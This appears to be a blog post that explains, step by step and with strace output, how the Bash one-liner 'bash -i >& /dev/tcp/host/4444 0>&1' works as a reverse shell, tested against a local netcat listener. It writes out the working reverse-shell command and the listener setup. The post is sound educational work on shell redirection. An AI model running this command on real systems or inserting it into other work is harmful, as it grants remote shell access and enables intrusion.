+++
title = "One Line Reverse Shell in Bash"
slug = "reverse-shell-in-bash"
date = 2018-01-10T06:41:19Z
desc = "Figuring out how a Bash one-liner works as a reverse shell."
tags = ["security", "tools"]
+++

Yesterday I saw a message from [Bryan Brake] on one of the [BrakeSec Slack] channels:

> This is a pretty bit of bash scripting *bash -i >& /dev/tcp/192.168.8.198&#x002f;4444 0>&1*

I knew that it’s a reverse shell&#8239;---&thinsp;a tool that connects the target computer back to you (hence the ‘reverse’) and then allows you to execute commands on that machine (‘shell’). But how does it work?

*Skip to the [Summary] if you just want the answer.*

## Setup

Bryan then mentioned that this command is supposed to be used with a [netcat], which is `nc` or `ncat` depending on your version, listening on port `4444` of the computer with <abbr>IP</abbr> `192.168.8.198`:
```
$ nc -v -n -l -p 4444
# -v — be verbose
# -n — do not try to inverse lookup IPs that connect to us
# -l — listen
# -p 4444 — port to listen on
```

I didn’t want to run my shell over the open Internet, so I replaced `192.168.8.198` with the loopback <abbr>IP</abbr> `127.0.0.1`:
```
# (1) run in the first terminal
$ nc -vnlp 4444

# (2) and then in the second
$ bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

And it works! Now, let’s figure it out one peace at the time, starting from `bash -i`.

## Interactive Bash

According to the [Bash] man page (`man bash`), option `-i` means that we’re starting an _“interactive shell.”_ The _Invocation_ section then explains that non-interactive shell will not execute its startup files: all those `/etc/profile`, `~/.profile`, `~/.bashrc`, etc. It also says that Bash automatically starts in this interactive mode when there are no non-option arguments (unless you pass a command to execute with a `-c`) and when its standard input and error streams are both connected to terminals.

{{<lead>}}So why would we want an interactive shell?{{</lead>}} I think, just because it will be more like shells that we’re used to&#8239;---&thinsp;with default aliases, correctly set `PATH`, and a [prompt].

{{<lead>}}Ok, and why isn’t it interactive in our case?{{</lead>}} Those angle brackets in our command redirect standard streams; this probably make Bash think that it isn’t running in the terminal. Let’s look into it.

## Network Redirection

Redirection is a feature available in most of the shells that allow you to change where command’s output goes, and input comes from. For example, this will write the directory listing to the `dir.list` file:
```
$ ls -l > dir.list
```

A quick search through the good old man page reveals that `>& target` is just an alternative form of `&> target`, which in turn means `1> target 2>&1`&#8239;---&thinsp;redirect both standard output and standard error streams to the `target`.

At this point, I made a mistake thinking that `>& /dev/tcp/127.0.0.1/4444` is merely a redirect of stdout and stderr to some special file `/dev/tcp/127.0.0.1/4444` that automatically opens a <abbr>TCP</abbr> connection. Everything is a file on Linux after all, right? This can even be “confirmed” by redirecting the output of a simple `echo`:
```
# (1) don’t forget to start listening,
# since nc will quit every time you disconnect;
# I’ll omit it in the following listings
$ nc -nvlp 4444

# (2) it works!
$ echo hello, world > /dev/tcp/127.0.0.1/4444
```

But then I’ve tried to do the same thing from [<abbr>ZSH</abbr>][ZSH]:
```
$ echo hello, world > /dev/tcp/127.0.0.1/4444
zsh: no such file or directory: /dev/tcp/127.0.0.1/4444
```
{{<lead>}}Why doesn't it work in <abbr>ZSH</abbr>?{{</lead>}} It turns out, it could be a special file, but I think this isn’t supported on my Debian, so Bash just emulates them, while <abbr>ZSH</abbr> does not. What’s interesting to note, it works without any special rights!

Now for the most confusing part.

## Sending your stdin to stdout

That’s exactly how `0>&1` reads to me. What does it even mean?!

At first, I thought this is needed so that the server, i.e. netcat side, would see its input back. I’ve tested my idea by removing it from the command. That broke the ‘shell’ part: now I could still see commands and their output on the server side, but couldn’t execute anything! You should play with it; it’s kind of a weird setup:
```
$ bash -i >& /dev/tcp/127.0.0.1/4444
```

At this point, I remembered about this tool `strace`, which allows you to see the kernel functions called by the program. Inspired by the example of [Julia Evans], I wasn’t afraid to try it. 😄

### Investigating with strace

I didn’t know what system call I wanted to find, so I just ran it without any filters and saved the full output to `strace.out` file:
```
$ strace -f bash -c 'bash -i /dev/tcp/127.0.0.1/4444 0>&1' > strace.out
# -f — makes strace follow the child processes created
# I wrapped my command in 'bash -c' so that redirections
# do not affect strace itself
```

Then I used `grep` to find the line with a string ‘127.0.0.1’ in it:
```
$ grep --line-number '127.0.0.1' strace.out
1:execve("/bin/bash", ["bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/44"...], 0x7fff7df714d8 /* 57 vars */) = 0
200:[pid  5106] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
```

First hit isn’t interesting, it’s just `strace` executing our command. But the second one looks promising. Here it is with a couple more lines around:
```
199: [pid  5106] socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
200: [pid  5106] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
201: [pid  5106] dup2(3, 1)                  = 1
202: [pid  5106] close(3)                    = 0
203: [pid  5106] dup2(1, 2)                  = 2
204: [pid  5106] dup2(1, 0)                  = 0
205: [pid  5106] fcntl(1, F_GETFD)           = 0
206: [pid  5106] execve("/bin/bash", ["bash", "-i"], 0x2485008 /* 57 vars */) = 0
```

* According to `man socket`, call to `socket()` returns a file descriptor (_fd_), in our case, it’s `3`. Then `connect()`, unsurprisingly, connects a socket identified by the fd to the given address. Ok, so after the first two lines we have an open socket to our server.
* Again, consulting with `man` reveals that `dup2(3, 1)` on line 3 will close fd `1`, which is our stdout, and create a copy of the socket (fd `3`) on it. _“After  a  successful return, the old and new file descriptors may be used interchangeably.”_ Now we close `3` since we don’t need the original anymore. Great! The `1> /dev/tcp/...` part is done in four syscalls.
* On line 203 `dup(1, 2)` does the same thing to our stderr: closes original and makes a copy of a socket to fd `2`. We’re now done with the `>& /dev/tcp/…`.

Only after meditating on line 204 for a while, it clicked for me: I was completely wrong about redirections! Using them is *not* like connecting tubes, even if it typically looks that way. Both `>` and `<` are *value assignments!*

When you do `ls -l > dir.list` you are not somehow “sending” the output from `ls` to the file. You’re _assigning_ the file `dir.list` to the standard output of `ls`.

This also explains why you can put redirections wherever you like around the command:
```
# these are the same
$ some_cmd -v > file
$ > file some_cmd -v
$ some_cmd > file -v
```
But the order of redirections relative to each other matters:
```
# stderr := stdout
# stdout := file
$ some_cmd 2>&1 1>file

# stdout := file
# stderr := stdout (== file)
$ some_cmd 1>file 2>&1
```

When we execute `0>&1`, we’re assigning to stdin the stdout’s fd, which is at that point is a socket. It doesn’t change almost anything if we do it the other way around: `0<&1`&#8239;---&thinsp;it’s still `stdin := stdout`. The only difference is that `>` checks if a target is available for writing and `<` tests for reading. Our socket is bidirectional, so it passes both.

## Summary

When you execute `$ bash -i >& /dev/tcp/192.168.8.198/4444 0>&1`

* first, Bash will (somehow?) check if special files `/dev/tcp/<host>/<port>` are supported by your <abbr>OS</abbr> and if they aren’t, it will emulate them by opening a <abbr>TCP</abbr> connection to `192.168.8.198:4444` for you
* it will also _reassign_ all three standard streams&#8239;---&thinsp;stdin, stdout, and stderr&#8239;---&thinsp;to the socket with this new connection, so all the output will go into, and input will be read from this socket
* then it will start a new interactive Bash session

## Links/Resources

* man page for Bash; thanks, Brian Fox and Chet Ramey!
* [“Redirection” page][redirection] on [Bash Hackers Wiki][bash-hackers]
* man pages for the syscalls, written as part of the [Linux man-pages project][man-pages]
* Julia’s excellent [talk][julia-talk], [blog posts][julia-blog] and [zines][julia-zine] on `strace`
* to join [BrakeSec Slack], as one should, send a quick DM to [@BrakeSec]

[Bryan Brake]: https://twitter.com/bryanbrake
[Julia Evans]: https://jvns.ca/
[BrakeSec slack]: https://brakesec.slack.com
[summary]: #summary
[netcat]: http://nc110.sourceforge.net/
[Bash]: https://en.wikipedia.org/wiki/Bash_(Unix_shell)
[ZSH]: https://en.wikipedia.org/wiki/Z_shell
[prompt]: https://en.wikipedia.org/wiki/Command-line_interface#Command_prompt
[man-pages]: https://www.kernel.org/doc/man-pages/
[redirection]: http://wiki.bash-hackers.org/syntax/redirection
[bash-hackers]: http://wiki.bash-hackers.org/start
[julia-talk]: https://www.youtube.com/watch?v=HfD9IMZ9rKY
[julia-blog]: https://jvns.ca/categories/strace/
[julia-zine]: https://jvns.ca/zines/#strace-zine
[@BrakeSec]: https://twitter.com/BrakeSec
